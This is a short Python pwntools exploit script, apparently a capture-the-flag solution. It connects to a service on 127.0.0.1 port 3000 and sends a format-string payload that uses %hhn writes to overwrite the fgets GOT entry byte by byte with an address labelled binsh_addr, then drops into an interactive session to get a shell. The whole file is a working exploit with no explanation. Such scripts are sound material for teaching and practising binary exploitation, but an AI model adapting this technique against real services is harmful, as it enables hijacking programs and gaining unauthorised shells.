# coding:utf-8
from __future__ import division
from pwn import remote

def p32(addr):
    ret = ""
    for i in range(4):
        x = addr % 256
        addr = addr // 256
        ret += chr(x)
    return ret

host = "127.0.0.1"
port = 3000
r = remote(host, port)

binsh_addr = 0x080484fd
fgets_got = 0x804a014

pos = 6

buf = "a"

for i in range(4):
    addr = fgets_got + i
    buf += p32(addr)

cnt = len(buf)
for i in range(4):
    x = binsh_addr % 256
    binsh_addr = binsh_addr // 256
    offset = (x - cnt) % 256
    buf += "%{0}c%{1}$hhn".format(offset, pos + i)
    cnt += offset
#print(buf)
r.sendline(buf)
r.interactive()

